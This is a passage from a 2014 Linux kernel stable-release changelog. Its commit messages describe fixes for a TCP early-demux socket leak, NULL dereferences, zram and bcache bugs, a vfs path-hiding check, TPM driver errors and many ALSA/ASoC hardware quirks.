0a e0 20 6a 40 04 1b 37 92 be 32 e2 e8 b4 00 00 .. j@..7..2.....
02 00 07 01 00 00 00 00 00 00 00 00 00 00 00 00 ................
backtrace:
[] kmem\_cache\_alloc+0xad/0xb9
[] sk\_prot\_alloc+0x29/0xc5
[] sk\_clone\_lock+0x14/0x283
[] inet\_csk\_clone\_lock+0xf/0x7b
[] netlink\_broadcast+0x14/0x16
[] tcp\_create\_openreq\_child+0x1b/0x4c3
[] tcp\_v4\_syn\_recv\_sock+0x38/0x25d
[] tcp\_check\_req+0x25c/0x3d0
[] tcp\_v4\_do\_rcv+0x287/0x40e
[] ip\_route\_input\_noref+0x843/0xa55
[] tcp\_v4\_rcv+0x4c9/0x725
[] ip\_local\_deliver\_finish+0xe9/0x154
[] \_\_netif\_receive\_skb+0x4b2/0x514
[] process\_backlog+0xee/0x1c5
[] net\_rx\_action+0xa7/0x200
[] add\_interrupt\_randomness+0x39/0x157
But there are many more, resulting in the machine going OOM after some
days.
From looking at the TPROXY code, and with help from Florian, I see
that the memory leak is introduced in tcp\_v4\_early\_demux():
void tcp\_v4\_early\_demux(struct sk\_buff \*skb)
{
/\* ... \*/
iph = ip\_hdr(skb);
th = tcp\_hdr(skb);
if (th->doff < sizeof(struct tcphdr) / 4)
return;
sk = \_\_inet\_lookup\_established(dev\_net(skb->dev), &tcp\_hashinfo,
iph->saddr, th->source,
iph->daddr, ntohs(th->dest),
skb->skb\_iif);
if (sk) {
skb->sk = sk;
where the socket is assigned unconditionally to skb->sk, also bumping
the refcnt on it. This is problematic, because in our case the skb
has already a socket assigned in the TPROXY target. This then results
in the leak I see.
The very same issue seems to be with IPv6, but haven't tested.
Reviewed-by: Florian Westphal
Signed-off-by: Holger Eitzenberger
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 5c9dfac1cf67e2d4a9e6e72379ff205ae5f7ebe8
Author: Oliver Hartkopp
Date: Thu Jan 23 10:19:34 2014 +0100
fib\_frontend: fix possible NULL pointer dereference
[ Upstream commit a0065f266a9b5d51575535a25c15ccbeed9a9966 ]
The two commits 0115e8e30d (net: remove delay at device dismantle) and
748e2d9396a (net: reinstate rtnl in call\_netdevice\_notifiers()) silently
removed a NULL pointer check for in\_dev since Linux 3.7.
This patch re-introduces this check as it causes crashing the kernel when
setting small mtu values on non-ip capable netdevices.
Signed-off-by: Oliver Hartkopp
Acked-by: Eric Dumazet
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 93199ca47ddf8047144d5569f19564fdbaf7ec40
Author: Or Gerlitz
Date: Thu Jan 23 11:28:13 2014 +0200
net/vxlan: Share RX skb de-marking and checksum checks with ovs
[ Upstream commit d0bc65557ad09a57b4db176e9e3ccddb26971453 ]
Make sure the practice set by commit 0afb166 "vxlan: Add capability
of Rx checksum offload for inner packet" is applied when the skb
goes through the portion of the RX code which is shared between
vxlan netdevices and ovs vxlan port instances.
Cc: Joseph Gasparakis
Cc: Pravin B Shelar
Signed-off-by: Or Gerlitz
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit f2e02efa3b861bbd2a50931b29c799fe4a377ab2
Author: Duan Jiong
Date: Thu Jan 23 14:00:25 2014 +0800
ip\_tunnel: clear IPCB in ip\_tunnel\_xmit() in case dst\_link\_failure() is called
[ Upstream commit 11c21a307d79ea5f6b6fc0d3dfdeda271e5e65f6 ]
commit a622260254ee48("ip\_tunnel: fix kernel panic with icmp\_dest\_unreach")
clear IPCB in ip\_tunnel\_xmit() , or else skb->cb[] may contain garbage from
GSO segmentation layer.
But commit 0e6fbc5b6c621("ip\_tunnels: extend iptunnel\_xmit()") refactor codes,
and it clear IPCB behind the dst\_link\_failure().
So clear IPCB in ip\_tunnel\_xmit() just like commti a622260254ee48("ip\_tunnel:
fix kernel panic with icmp\_dest\_unreach").
Signed-off-by: Duan Jiong
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 78405c1b5ec581abff61d72a0e56590737824207
Author: Anton Blanchard
Date: Mon Dec 9 16:03:10 2013 +1100
drivers/tty: ehv\_bytechan fails to build as a module
commit a183d3ae63c08186477d2b0ef2798d47d10add4b upstream.
ehv\_bytechan is marked tristate but fails to build as a module:
drivers/tty/ehv\_bytechan.c:363:1: error: type defaults to ‘int’ in declaration of ‘console\_initcall’ [-Werror=implicit-int]
It doesn't make much sense for a console driver to be built as
a module, so change it to a bool.
Signed-off-by: Anton Blanchard
Acked-by: Greg Kroah-Hartman
Signed-off-by: Scott Wood
Cc: Guenter Roeck
Signed-off-by: Greg Kroah-Hartman
commit f52c045e05025727da918570fb9ac29f3239caaf
Author: Shane Huang
Date: Wed Jan 22 14:05:46 2014 -0800
i2c: piix4: Add support for AMD ML and CZ SMBus changes
commit 032f708bc4f6da868ec49dac48ddf3670d8035d3 upstream.
The locations of SMBus register base address and enablement bit are changed
from AMD ML, which need this patch to be supported.
Signed-off-by: Shane Huang
Reviewed-by: Jean Delvare
Signed-off-by: Wolfram Sang
Signed-off-by: Greg Kroah-Hartman
commit c1d9c71fc913e93307ddae3ff140684e3dae9deb
Author: Gregory CLEMENT
Date: Tue Dec 31 17:07:35 2013 +0100
i2c: mv64xxx: Document the newly introduced Armada XP A0 compatible
commit f8b94beb7e6a374cb0de531b72377c49857b35ca upstream.
The first variants of Armada XP SoCs (A0 stepping) have issues related
to the i2c controller which prevent to use the offload mechanism and
lead to a kernel hang during boot.
The commit introduces a new the compatible string
marvell,mv78230-a0-i2c for the i2c controller.
Signed-off-by: Gregory CLEMENT
Acked-by: Arnd Bergmann
cc: devicetree@vger.kernel.org
Fixes: 930ab3d403ae (i2c: mv64xxx: Add I2C Transaction Generator support)
Signed-off-by: Jason Cooper
Signed-off-by: Greg Kroah-Hartman
commit e70322ad000f6b1c9cc81c345542241d34e283c8
Author: Gregory CLEMENT
Date: Tue Dec 31 16:59:33 2013 +0100
i2c: mv64xxx: Fix bus hang on A0 version of the Armada XP SoCs
commit 6cf70ae928bae17077efc0d528dec49bc380438b upstream.
The first variants of Armada XP SoCs (A0 stepping) have issues related
to the i2c controller which prevent to use the offload mechanism and
lead to a kernel hang during boot.
The commit introduces a new the compatible string
marvell,mv78230-a0-i2c for the i2c controller. When this compatible
string is used the driver disables the offload mechanism and the
kernel no more hangs on these SoCs.
Signed-off-by: Gregory CLEMENT
Reported-by: Andrew Lunn
Acked-by: Wolfram Sang
Acked-by: Arnd Bergmann
Fixes: 930ab3d403ae (i2c: mv64xxx: Add I2C Transaction Generator support)
Signed-off-by: Jason Cooper
Signed-off-by: Greg Kroah-Hartman
commit 5f800a1159c1fc8d3f7c4b4891117e7fe738a8d2
Author: Gregory CLEMENT
Date: Tue Jan 7 16:26:01 2014 +0100
ARM: mvebu: Add quirk for i2c for the OpenBlocks AX3-4 board
commit 85e618a1be2b2092318178d1d66bdad49cbbeeeb upstream.
The first variants of Armada XP SoCs (A0 stepping) have issues related
to the i2c controller which prevent to use the offload mechanism and
lead to a kernel hang during boot.
This commit add quirk in the mvebu platform code to check the SoC
version and then update the compatible string for the i2c controller
according to the revision of the SoC. Currently only some OpenBlocks
AX3-4 boards are known to use an A0 revision so the check is done only
for these boards.
Signed-off-by: Gregory CLEMENT
Fixes: 930ab3d403ae (i2c: mv64xxx: Add I2C Transaction Generator support)
Acked-by: Arnd Bergmann
Signed-off-by: Jason Cooper
Signed-off-by: Greg Kroah-Hartman
commit 1aed03315395bc36aaafbc50e36841520c41abee
Author: Gregory CLEMENT
Date: Thu Jan 2 15:08:59 2014 +0100
ARM: mvebu: Add support to get the ID and the revision of a SoC
commit af8d1c63afcbf36eea06789c92e22d4af118d2fb upstream.
All the mvebu SoCs have information related to their variant and
revision that can be read from the PCI control register.
This patch adds support for Armada XP and Armada 370. This reading of
the revision and the ID are done before the PCI initialization to
avoid any conflicts. Once these data are retrieved, the resources are
freed to let the PCI subsystem use it.
Fixes: 930ab3d403ae (i2c: mv64xxx: Add I2C Transaction Generator support)
Signed-off-by: Gregory CLEMENT
Acked-by: Arnd Bergmann
Signed-off-by: Jason Cooper
Signed-off-by: Greg Kroah-Hartman
commit 33e02be955a04b0b1f137db77a94761986892825
Author: Takashi Iwai
Date: Mon Jan 13 12:32:44 2014 +0100
hp\_accel: Add a new PnP ID HPQ6007 for new HP laptops
commit b0ad4ff35d479a46a3b995a299db9aeb097acfce upstream.
The DriveGuard chips on the new HP laptops are with a new PnP ID
"HPQ6007". It should be compatible with older chips.
Acked-by: Éric Piel
Signed-off-by: Takashi Iwai
Signed-off-by: Matthew Garrett
Signed-off-by: Greg Kroah-Hartman
commit a76055cd067d7d6aee361b60b3fa5338c0a6f017
Author: Minchan Kim
Date: Thu Jan 30 15:45:58 2014 -0800
zram: fix race between reset and flushing pending work
commit da4a04126baa3be03bc566d4a2ee0944c5e783d0 upstream.
Dan and Sergey reported that there is a racy between reset and flushing
of pending work so that it could make oops by freeing zram->meta in
reset while zram\_slot\_free can access zram->meta if new request is
adding during the race window.
This patch moves flush after taking init\_lock so it prevents new request
so that it closes the race.
Signed-off-by: Minchan Kim
Reported-by: Dan Carpenter
Cc: Nitin Gupta
Cc: Jerome Marchand
Tested-by: Sergey Senozhatsky
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 9047ec62665cb8931840214b038cc1d22c4ed2e4
Author: Kent Overstreet
Date: Tue Dec 17 17:51:02 2013 -0800
bcache: Data corruption fix
commit ef71ec00002d92a08eb27e9d036e3d48835b6597 upstream.
The code that handles overlapping extents that we've just read back in from disk
was depending on the behaviour of the code that handles overlapping extents as
we're inserting into a btree node in the case of an insert that forced an
existing extent to be split: on insert, if we had to split we'd also insert a
new extent to represent the top part of the old extent - and then that new
extent would get written out.
The code that read the extents back in thus not bother with splitting extents -
if it saw an extent that ovelapped in the middle of an older extent, it would
trim the old extent to only represent the bottom part, assuming that the
original insert would've inserted a new extent to represent the top part.
I still haven't figured out \_how\_ it can happen, but I'm now pretty convinced
(and testing has confirmed) that there's some kind of an obscure corner case
(probably involving extent merging, and multiple overwrites in different sets)
that breaks this. The fix is to change the mergesort fixup code to split extents
itself when required.
Signed-off-by: Kent Overstreet
Signed-off-by: Greg Kroah-Hartman
commit 860abe4c33f491aa5c79acc916d01af978e64aec
Author: Eric W. Biederman
Date: Mon Jan 20 15:26:15 2014 -0800
vfs: Is mounted should be testing mnt\_ns for NULL or error.
commit 260a459d2e39761fbd39803497205ce1690bc7b1 upstream.
A bug was introduced with the is\_mounted helper function in
commit f7a99c5b7c8bd3d3f533c8b38274e33f3da9096e
Author: Al Viro
Date: Sat Jun 9 00:59:08 2012 -0400
get rid of ->mnt\_longterm
it's enough to set ->mnt\_ns of internal vfsmounts to something
distinct from all struct mnt\_namespace out there; then we can
just use the check for ->mnt\_ns != NULL in the fast path of
mntput\_no\_expire()
Signed-off-by: Al Viro
The intent was to test if the real\_mount(vfsmount)->mnt\_ns was
NULL\_OR\_ERR but the code is actually testing real\_mount(vfsmount)
and always returning true.
The result is d\_absolute\_path returning paths it should be hiding.
Signed-off-by: "Eric W. Biederman"
Signed-off-by: Al Viro
Signed-off-by: Greg Kroah-Hartman
commit 9650c1d10aff25a58575a9304d27a6908ad88b1f
Author: Eric W. Biederman
Date: Mon Jan 20 15:43:25 2014 -0800
vfs: Remove second variable named error in \_\_dentry\_path
commit a8323da0366d3398eda62741d2ac1130c8a172ed upstream.
In commit 232d2d60aa5469bb097f55728f65146bd49c1d25
Author: Waiman Long
Date: Mon Sep 9 12:18:13 2013 -0400
dcache: Translating dentry into pathname without taking rename\_lock
The \_\_dentry\_path locking was changed and the variable error was
intended to be moved outside of the loop. Unfortunately the inner
declaration of error was not removed. Resulting in a version of
\_\_dentry\_path that will never return an error.
Remove the problematic inner declaration of error and allow
\_\_dentry\_path to return errors once again.
Cc: Waiman Long
Signed-off-by: "Eric W. Biederman"
Signed-off-by: Al Viro
Signed-off-by: Greg Kroah-Hartman
commit 4cd96b4772c6c98b4bc0043fb7f2d284220223fa
Author: Theodore Ts'o
Date: Tue Jan 7 12:58:19 2014 -0500
ext4: avoid clearing beyond i\_blocks when truncating an inline data file
commit 09c455aaa8f47a94d5bafaa23d58365768210507 upstream.
A missing cast means that when we are truncating a file which is less
than 60 bytes, we don't clear the correct area of memory, and in fact
we can end up truncating the next inode in the inode table, or worse
yet, some other kernel data structure.
Addresses-Coverity-Id: #751987
Signed-off-by: "Theodore Ts'o"
Signed-off-by: Greg Kroah-Hartman
commit 6b78ac03be5b667fb0c59360d317fcda40379d6e
Author: Tejun Heo
Date: Thu Jan 16 09:47:17 2014 -0500
libata: disable LPM for some WD SATA-I devices
commit ecd75ad514d73efc1bbcc5f10a13566c3ace5f53 upstream.
For some reason, some early WD drives spin up and down drives
erratically when the link is put into slumber mode which can reduce
the life expectancy of the device significantly. Unfortunately, we
don't have full list of devices and given the nature of the issue it'd
be better to err on the side of false positives than the other way
around. Let's disable LPM on all WD devices which match one of the
known problematic model prefixes and are SATA-I.
As horkage list doesn't support matching SATA capabilities, this is
implemented as two horkages - WD\_BROKEN\_LPM and NOLPM. The former is
set for the known prefixes and sets the latter if the matched device
is SATA-I.
Note that this isn't optimal as this disables all LPM operations and
partial link power state reportedly works fine on these; however, the
way LPM is implemented in libata makes it difficult to precisely map
libata LPM setting to specific link power state. Well, these devices
are already fairly outdated. Let's just disable whole LPM for now.
Signed-off-by: Tejun Heo
Reported-and-tested-by: Nikos Barkas
Reported-and-tested-by: Ioannis Barkas
References: https://bugzilla.kernel.org/show\_bug.cgi?id=57211
Signed-off-by: Greg Kroah-Hartman
commit 1b45143a96ffc481ea8b9bf56d2a6f8b56667cac
Author: Simon Guinot
Date: Tue Jan 14 20:10:27 2014 +0100
ARM: mvebu: update the SATA compatible string for Armada 370/XP
commit a96cc303e42ad7830dde929aad0046e448a05505 upstream.
This patch updates the Armada 370/XP SATA node with the new compatible
string "marvell,armada-370-sata".
Signed-off-by: Simon Guinot
Cc: Thomas Petazzoni
Cc: Jason Cooper
Cc: Andrew Lunn
Cc: Gregory Clement
Cc: Sebastian Hesselbarth
Cc: Lior Amsalem
Acked-by: Jason Cooper
Signed-off-by: Tejun Heo
Signed-off-by: Greg Kroah-Hartman
commit c4f351e601ead476efbc959084bd879418847bf9
Author: Lior Amsalem
Date: Tue Jan 14 20:09:57 2014 +0100
ata: sata\_mv: fix disk hotplug for Armada 370/XP SoCs
commit 9013d64e661fc2a37a1742670202171c27fef4b5 upstream.
On Armada 370/XP SoCs, once a disk is removed from a SATA port, then the
re-plug events are not detected by the sata\_mv driver. This patch fixes
the issue by updating the PHY speed in the LP\_PHY\_CTL register (0x58)
according to the SControl speed.
Note that this fix is only applied if the compatible string
"marvell,armada-370-sata" is found in the SATA DT node.
Fixes: 9ae6f740b49f ("arm: mach-mvebu: add support for Armada 370 and Armada XP with DT")
Signed-off-by: Lior Amsalem
Signed-off-by: Nadav Haklai
Signed-off-by: Simon Guinot
Cc: Thomas Petazzoni
Cc: Jason Cooper
Cc: Andrew Lunn
Cc: Gregory Clement
Cc: Sebastian Hesselbarth
Acked-by: Jason Cooper
Signed-off-by: Tejun Heo
Signed-off-by: Greg Kroah-Hartman
commit 191f444122ec2afe41ae78119805dd1af915e4ce
Author: Simon Guinot
Date: Tue Jan 14 20:04:39 2014 +0100
ata: sata\_mv: introduce compatible string "marvell, armada-370-sata"
commit b1f5c73bd5a4752efb7d7af019034044b08aafe9 upstream.
The sata\_mv driver supports the SATA IP found in several Marvell SoCs.
As some new SATA registers have been introduced with the Armada 370/XP
SoCs, a way to identify them is needed.
This patch introduces a new compatible string for the SATA IP found in
Armada 370/XP SoCs.
Signed-off-by: Simon Guinot
Cc: Thomas Petazzoni
Cc: Jason Cooper
Cc: Andrew Lunn
Cc: Gregory Clement
Cc: Sebastian Hesselbarth
Cc: Lior Amsalem
Acked-by: Jason Cooper
Signed-off-by: Tejun Heo
Signed-off-by: Greg Kroah-Hartman
commit f5ceff3d8c64d07e716e3f97734037e448327a72
Author: Roberto Sassu
Date: Fri Nov 8 19:21:35 2013 +0100
ima: change the default hash algorithm to SHA1 in ima\_eventdigest\_ng\_init()
commit c502c78ba7fb5b9cef71e2bd70f12c38ef26e5ab upstream.
Replace HASH\_ALGO\_\_LAST with HASH\_ALGO\_SHA1 as the initial value of
the hash algorithm so that the prefix 'sha1:' is added to violation
digests.
Fix commit:
4d7aeee ima: define new template ima-ng and template fields d-ng and n-ng
Signed-off-by: Roberto Sassu
Signed-off-by: Mimi Zohar
Signed-off-by: Greg Kroah-Hartman
commit b6bb44f306acf3555fc1f89ec8f708e7109c6d17
Author: Peter Huewe
Date: Wed Oct 30 20:46:55 2013 +0100
tpm/tpm\_ppi: Do not compare strcmp(a,b) == -1
commit 747d35bd9bb4ae6bd74b19baa5bbe32f3e0cee11 upstream.
Depending on the implementation strcmp might return the difference between
two strings not only -1,0,1 consequently
if (strcmp (a,b) == -1)
might lead to taking the wrong branch
-> compare with < 0 instead,
which in any case is more canonical.
Signed-off-by: Peter Huewe
Signed-off-by: Greg Kroah-Hartman
commit 5ef2e9bc3c840ab1b3c7ac404e6c5e1795f6cb2d
Author: Peter Huewe
Date: Wed Oct 30 00:54:20 2013 +0100
tpm/tpm\_i2c\_stm\_st33: Check return code of get\_burstcount
commit 85c5e0d451125c6ddb78663972e40af810b83644 upstream.
The 'get\_burstcount' function can in some circumstances 'return -EBUSY' which
in tpm\_stm\_i2c\_send is stored in an 'u32 burstcnt'
thus converting the signed value into an unsigned value, resulting
in 'burstcnt' being huge.
Changing the type to u32 only does not solve the problem as the signed
value is converted to an unsigned in I2C\_WRITE\_DATA, resulting in the
same effect.
Thus
-> Change type of burstcnt to u32 (the return type of get\_burstcount)
-> Add a check for the return value of 'get\_burstcount' and propagate a
potential error.
This makes also sense in the 'I2C\_READ\_DATA' case, where the there is no
signed/unsigned conversion.
found by coverity
Signed-off-by: Peter Huewe
Signed-off-by: Greg Kroah-Hartman
commit a0372de295fb1d46179694b85da1192071470820
Author: Stephen Warren
Date: Thu Jan 30 11:52:16 2014 -0700
ALSA: hda/hdmi - allow PIN\_OUT to be dynamically enabled
commit 75fae117a5dbde5ab984fa5c60705758cfbc6433 upstream.
Commit 384a48d71520 "ALSA: hda: HDMI: Support codecs with fewer cvts
than pins" dynamically enabled each pin widget's PIN\_OUT only when the
pin was actively in use. This was required on certain NVIDIA CODECs for
correct operation. Specifically, if multiple pin widgets each had their
mux input select the same audio converter widget and each pin widget had
PIN\_OUT enabled, then only one of the pin widgets would actually receive
the audio, and often not the one the user wanted!
However, this apparently broke some Intel systems, and commit
6169b673618b "ALSA: hda - Always turn on pins for HDMI/DP" reverted the
dynamic setting of PIN\_OUT. This in turn broke the afore-mentioned NVIDIA
CODECs.
This change supports either dynamic or static handling of PIN\_OUT,
selected by a flag set up during CODEC initialization. This flag is
enabled for all recent NVIDIA GPUs.
Reported-by: Uosis
Signed-off-by: Stephen Warren
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 30cb840c2939f29eb3149c7934903ecf9f191401
Author: Hui Wang
Date: Thu Jan 30 10:55:51 2014 +0800
ALSA: hda - add headset mic detect quirks for another Dell laptop
commit 5e87d5807110afd6bd659e1b98929fab43f3732f upstream.
When we plug a 3-ring headset on the Dell machine (Vendor ID:
0x10ec0255, Subsystem ID: 0x1028064d), the headset mic can't be
detected, after apply this patch, the headset mic can work well.
BugLink: https://bugs.launchpad.net/bugs/1260303
Cc: David Henningsson
Tested-by: Doro Wu
Signed-off-by: Hui Wang
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit fbd50fc43507d112a07b9a93297ce2a7d5a6fa2b
Author: Adrien Vergé
Date: Fri Jan 24 14:56:14 2014 -0500
ALSA: hda - Fix silent output on MacBook Air 1,1
commit e7729a415315fcd9516912050d85d5aaebcededc upstream.
Similarly to other Apple products, MBA 1,1 needs a specific quirk.
Pin 0x18 must be set to VREF\_50 to have sound output. This was no
longer done since commit 1a97b7f, resulting in a mute built-in speaker.
This patch corrects the regression by creating a fixup for the MBA 1,1.
Fixes: 1a97b7f22774 ("ALSA: hda/realtek - Remove the last static quirks for ALC882")
Tested-by: Adrien Vergé
Signed-off-by: Adrien Vergé
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit ae4aaae623c4b4991aaeee803439da2710a602ed
Author: Dan Carpenter
Date: Thu Jan 23 11:21:28 2014 +0300
ALSA: bits vs bytes bug in snd\_card\_create()
commit 4c3773eda49c872a3034382f8ec3080002e715bf upstream.
The test here is intended intended to prevent shift wrapping bugs when
we do "1U << idx2". We should consider the number of bits in a u32
instead of the number of bytes.
[fix another chunk similarly by tiwai]
Fixes: 7bb2491b35a2 ('ALSA: Add kconfig to specify the max card numbers')
Signed-off-by: Dan Carpenter
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit d4c3c4f241f54209124f28b88d0bad8e76b165f6
Author: Hui Wang
Date: Thu Jan 16 15:51:10 2014 +0800
ALSA: hda - add headset mic detect quirks for some Dell machines
commit c48ae0ab3790efba2dfb1a4709c0ef8da024de1a upstream.
When we plug a 3-ring headset on some Dell machines, the headset
mic can't be detected, after apply this patch, the headset mic
can work well on all those machines.
On the machine with the Subsytem ID 0x10280610, if we use
ALC269\_FIXUP\_DELL1\_MIC\_NO\_PRESENCE, the headset mic can be
detected and work well, but the sound can't be outputed via
headphone anymore, use ALC269\_FIXUP\_DELL3\_MIC\_NO\_PRESENCE
can fix this problem.
BugLink: https://bugs.launchpad.net/bugs/1260303
Cc: David Henningsson
Tested-by: David Chen
Tested-by: Cyrus Lien
Tested-by: Shawn Wang
Tested-by: Chih-Hsyuan Ho
Signed-off-by: Hui Wang
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 7d947f8cfb5c4e18c6772721b324cc97d4affa46
Author: Hui Wang
Date: Tue Jan 14 14:07:36 2014 +0800
ALSA: hda - automute via amp instead of pinctl on some AIO models
commit 493a52a9b6645f61954580c7d4bd52fa62110934 upstream.
On some AIO (All In One) models with the codec alc668
(Vendor ID: 0x10ec0668) on it, when we plug a headphone into the jack,
the system will switch the output to headphone and set the speaker to
automute as well as change the speaker Pin-ctls from 0x40 to 0x00,
this will bring loud noise to the headphone.
I tried to disable the corresponding EAPD, but it did not help to
eliminate the noise.
According to Takashi's suggestion, we use amp operation to replace the
pinctl modification for the automute, this really eliminate the noise.
BugLink: https://bugs.launchpad.net/bugs/1268468
Cc: David Henningsson
Signed-off-by: Hui Wang
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 25cb36334e92312684f5cc18bfcf1eb96eb00485
Author: Takashi Iwai
Date: Fri Jan 10 14:20:42 2014 +0100
ALSA: Enable CONFIG\_ZONE\_DMA for smaller PCI DMA masks
commit 80ab8eae70e51d578ebbeb228e0f7a562471b8b7 upstream.
The PCI devices with DMA masks smaller than 32bit should enable
CONFIG\_ZONE\_DMA. Since the recent change of page allocator, page
allocations via dma\_alloc\_coherent() with the limited DMA mask bits
may fail more frequently, ended up with no available buffers, when
CONFIG\_ZONE\_DMA isn't enabled. With CONFIG\_ZONE\_DMA, the system has
much more chance to obtain such pages.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=68221
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 91fda6476631db837d40655e0aa3cc80de3180a5
Author: Takashi Iwai
Date: Tue Jan 7 18:11:44 2014 +0100
ALSA: hda - Don't create duplicated ctls for loopback paths
commit 43a8e50a46a4e1dd1451e4a4ffa1f7695fb7d287 upstream.
AD1986A mic pins (0x1d and 0x1f) share the same widget for controlling
the loopback volume/mute, but the generic parser didn't check it.
This ended up with the duplicated controls for the same effect.
This patch adds the check of the duplication for avoiding it.
After this fix, there will be only one control although it affects
both paths; this remaining issue should be fixed later in a different
patch.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=66621
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 200a5a04b92a0e226ee2731c834883a0388f3689
Author: Takashi Iwai
Date: Tue Jan 7 17:48:11 2014 +0100
ALSA: hda - Correct AD1986A 3stack pin configs
commit ed0e0d0617a8dc3d8b82c6e54827f269f2247b07 upstream.
The 3stack pin configs for AD1986A codec had incorrect values that
resulted in broken mic and line-in.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=66621
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 22352b204088c6de570bedf318adafb164d9ea59
Author: Takashi Iwai
Date: Fri Dec 27 00:13:08 2013 +0200
ALSA: rme9652: fix a missing comma in channel\_map\_9636\_ds[]
commit 770bd4bf2e664939a9dacd3d26ec9ff7a3933210 upstream.
The lack of comma leads to the wrong channel for an SPDIF channel.
Unfortunately this wasn't caught by compiler because it's still a
valid expression.
Reported-by: Alexander Aristov
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 1b81516f6a730272ac117077a9b4072b9f6a9258
Author: Charles Keepax
Date: Tue Jan 21 16:27:51 2014 +0000
ASoC: wm5110: Extend SYSCLK patch file for rev D
commit 34354792432b6e0a3b156819a1a19716c50d3473 upstream.
Latest evaluation of the the device has given some patch file additions
for improved performance.
Signed-off-by: Charles Keepax
Signed-off-by: Mark Brown
Signed-off-by: Greg Kroah-Hartman
commit f76d48bbe631eb18132bf0c50a79a5dce64c2b3b
Author: Markus Pargmann
Date: Wed Jan 15 18:12:40 2014 +0100
ASoC: tlv320aic32x4: Fix regmap range\_min
commit e8e08c521dc101cf7e7e1caf4f487f9fe11a9a7a upstream.
range\_min is the lowest address in the virtual register range. This is
the first register with address 0, not the first register of page 1.
Currently all writes to page 1 are mapped to page 0, so the codec fails
to operate.
Fixes: 4d208ca429ad (ASoC: tlv320aic32x4: Convert to direct regmap API usage)
Signed-off-by: Markus Pargmann
Signed-off-by: Mark Brown
Signed-off-by: Greg Kroah-Hartman
commit 5609fd11c56addf3b3ce48b4e0f599282cdf0b62
Author: Markus Pargmann
Date: Sat Jan 11 14:48:30 2014 +0100
ASoC: codec: tlv320aic32x4: Fix regmap range config
commit 6d0d5103bdc45242b8d02e4130fbe5a3ea9f668a upstream.
This codec driver fails to probe because it has a higher regmap
range\_max value than max\_register. This patch sets the range\_max to the
max\_register value as described in the for struct regmap\_range\_cfg:
"@range\_max: Address of the highest register in virtual range."
Fixes: 4d208ca429ad (ASoC: tlv320aic32x4: Convert to direct regmap API usage)
Signed-off-by: Markus Pargmann
Signed-off-by: Mark Brown
Signed-off-by: Greg Kroah-Hartman
commit 81c828ddd476183a7c6fa23f0a52b31eb099e538
Author: Lars-Peter Clausen
Date: Wed Jan 8 11:22:25 2014 +0100
ASoC: adau1701: Fix ADAU1701\_SEROCTL\_WORD\_LEN\_16 constant
commit e20970ada3f699c113fe64b04492af083d11a7d8 upstream.
The driver defines ADAU1701\_SEROCTL\_WORD\_LEN\_16 as 0x10 while it should be b10,
so 0x2. This patch fixes it.
Reported-by: Magnus Reftel
Signed-off-by: Lars-Peter Clausen
Signed-off-by: Mark Brown
Signed-off-by: Greg Kroah-Hartman
commit eef2dc201d71a3dd199b6d00f00965803a4c730c
Author: Krzysztof Kozlowski
Date: Fri Dec 20 10:35:07 2013 +0100
mfd: max77686: Fix regmap resource leak on driver remove
commit 74142ffc0b52cfe6f9d2f6f34a5f3eedbfe3ce51 upstream.
The regmap used by max77686 MFD driver was not freed with regmap\_exit()
on driver exit. This lead to leak of resources.
Replace regmap\_init\_i2c() call in driver probe with initialization of
managed register map so the regmap will be properly freed by the device
management code.
Signed-off-by: Krzysztof Kozlowski
Signed-off-by: Lee Jones
Signed-off-by: Greg Kroah-Hartman
commit c73c940dd8716c88e72248f0b286f1ea1a59a81a
Author: Dongsheng Yang
Date: Fri Dec 20 13:41:47 2013 -0500
perf kvm: Fix kvm report without guestmount.
commit ad85ace07a05062ef6b59c35a5e80b6eaee1eee6 upstream.
Currently, if we use perf kvm --guestkallsyms --guestmodules report, we
can not get the perf information from perf data file. All sample are
shown as unknown.
Reproducing steps:
# perf kvm --guestkallsyms /tmp/kallsyms --guestmodules /tmp/modules record -a sleep 1
[ perf record: Woken up 1 times to write data ]
[ perf record: Captured and wrote 0.624 MB perf.data.guest (~27260 samples) ]
# perf kvm --guestkallsyms /tmp/kallsyms --guestmodules /tmp/modules report |grep %
100.00% [guest/6471] [unknown] [g] 0xffffffff8164f330
This bug was introduced by 207b57926 (perf kvm: Fix regression with guest machine creation).
In original code, it uses perf\_session\_\_find\_machine(), it means we deliver symbol to machine
which has the same pid, if no machine found, deliver it to \*default\* guest. But if we use
perf\_session\_\_findnew\_machine() here, if no machine was found, new machine with pid will be built
and added. Then the default guest which with pid == 0 will never get a symbol.
And because the new machine initialized here has no kernel map created, the symbol delivered to
it will be marked as "unknown".
This patch here is to revert commit 207b57926 and fix the SEGFAULT bug in another way.
Verification steps:
# ./perf kvm --guestkallsyms /home/kallsyms --guestmodules /home/modules record -a sleep 1
[ perf record: Woken up 1 times to write data ]
[ perf record: Captured and wrote 0.651 MB perf.data.guest (~28437 samples) ]
# ./perf kvm --guestkallsyms /home/kallsyms --guestmodules /home/modules report |grep %
22.64% :6471 [guest.kernel.kallsyms] [g] update\_rq\_clock.part.70
19.99% :6471 [guest.kernel.kallsyms] [g] d\_free
18.46% :6471 [guest.kernel.kallsyms] [g] bio\_phys\_segments
16.25% :6471 [guest.kernel.kallsyms] [g] dequeue\_task
12.78% :6471 [guest.kernel.kallsyms] [g] \_\_switch\_to
